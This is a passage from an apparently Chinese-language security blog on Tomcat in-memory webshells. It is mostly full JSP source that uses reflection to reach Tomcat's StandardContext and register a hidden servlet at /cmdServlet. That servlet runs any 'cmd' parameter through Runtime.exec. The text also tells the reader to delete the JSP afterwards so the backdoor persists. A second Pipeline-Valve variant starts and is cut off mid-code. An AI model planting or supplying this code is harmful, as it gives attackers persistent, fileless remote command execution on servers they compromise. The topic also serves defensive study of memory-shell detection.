class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardEngine&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardHost&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat6789</span> </span>&#123;</span><br><span class="line">    String uri;</span><br><span class="line">    String serverName;</span><br><span class="line">    StandardContext standardContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span> </span>&#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;&#125;</span><br><span class="line">            <span class="keyword">catch</span> (IllegalAccessException e)&#123;&#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat6789</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        Object object;</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!(target <span class="keyword">instanceof</span> Runnable)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                object = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            java.util.ArrayList processors = (java.util.ArrayList) getField(object, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            Iterator iterator = processors.iterator();</span><br><span class="line">            <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                Object next = iterator.next();</span><br><span class="line"></span><br><span class="line">                Object req = getField(next, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                Object serverPort = getField(req, <span class="string">&quot;serverPort&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (serverPort.equals(-<span class="number">1</span>))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;serverNameMB&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.serverName = (String) getField(serverNameMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;uriMB&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.uri = (String) getField(uriMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.getStandardContext();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStandardContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">                Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                HashMap children;</span><br><span class="line">                Object jioEndPoint = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (jioEndPoint == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Object service = getField(getField(getField(getField(getField(jioEndPoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;proto&quot;</span>), <span class="string">&quot;adapter&quot;</span>), <span class="string">&quot;connector&quot;</span>), <span class="string">&quot;service&quot;</span>);</span><br><span class="line">                StandardEngine engine = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">&quot;container&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (engine == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">&quot;engine&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(engine, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                StandardHost standardHost = (StandardHost) children.get(<span class="keyword">this</span>.serverName);</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(standardHost, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                Iterator iterator = children.keySet().iterator();</span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">                    String contextKey = (String) iterator.next();</span><br><span class="line">                    <span class="keyword">if</span> (!(<span class="keyword">this</span>.uri.startsWith(contextKey)))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                    StandardContext standardContext = (StandardContext) children.get(contextKey);</span><br><span class="line">                    <span class="keyword">this</span>.standardContext = standardContext;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StandardContext <span class="title">getSTC</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.standardContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%		</span><br><span class="line">    	<span class="comment">//获取StandardContext对象</span></span><br><span class="line">        Tomcat6789 a = <span class="keyword">new</span> Tomcat6789();</span><br><span class="line">        StandardContext standardContext = a.getSTC();</span><br><span class="line">    </span><br><span class="line">    	</span><br><span class="line">		<span class="comment">//创建恶意servlet</span></span><br><span class="line">		String servletURL = <span class="string">&quot;/cmdServlet&quot;</span>;</span><br><span class="line">        String servletName = <span class="string">&quot;CmdServlet&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Servlet servlet = <span class="keyword">new</span> Servlet() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig servletConfig)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                String cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;cmd&quot;</span> != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    PrintWriter out = servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建wrapper，设置恶意servlet</span></span><br><span class="line">        Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        <span class="comment">// 令loadOnStartup大于0</span></span><br><span class="line">        wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 添加到children容器中</span></span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置servlet映射</span></span><br><span class="line">        standardContext.addServletMappingDecoded(servletURL, servletName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问注入内存马的jsp文件，然后删除jsp文件，访问/cmdServlet路由，添加cmd参数执行命令</p>
<p><img src="image-20220228220927724.png" alt="image-20220228220927724"></p>
<h3 id="Pipeline-Valve内存马实现"><a href="#Pipeline-Valve内存马实现" class="headerlink" title="Pipeline-Valve内存马实现"></a>Pipeline-Valve内存马实现</h3><p>Container请求处理流程源码分析中讲到过<code>Pineline</code>的调用链，setNext、getNext、invoke 这三个方法，通过setNext设置该阀的下一阀，通过 getNext 返回该阀的下一个阀的引用，invoke 方法则执行该阀内部自定义的请求处理代码。</p>
<ol>
<li>创建恶意valve</li>
<li>获取Pineline对象通过addValve增加恶意valve</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardEngine&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardHost&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Tomcat6789</span> </span>&#123;</span><br><span class="line">        String uri;</span><br><span class="line">        String serverName;</span><br><span class="line">        StandardContext standardContext;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span> </span>&#123;</span><br><span class="line">            Field declaredField;</span><br><span class="line">            Class clazz = object.getClass();</span><br><span class="line">            <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                    declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                    declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e)&#123;&#125;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Tomcat6789</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            Object object;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!(target <span class="keyword">instanceof</span> Runnable)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    object = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.ArrayList processors = (java.util.ArrayList) getField(object, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                Iterator iterator = processors.iterator();</span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                    Object next = iterator.next();</span><br><span class="line"></span><br><span class="line">                    Object req = getField(next, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    Object serverPort = getField(req, <span class="string">&quot;serverPort&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (serverPort.equals(-<span class="number">1</span>))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                    org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;serverNameMB&quot;</span>);</span><br><span class="line">                    <span class="keyword">this</span>.serverName = (String) getField(serverNameMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.serverName = serverNameMB.toString();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.serverName = serverNameMB.getString();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;uriMB&quot;</span>);</span><br><span class="line">                    <span class="keyword">this</span>.uri = (String) getField(uriMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.uri = uriMB.toString();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.uri = uriMB.getString();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.getStandardContext();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        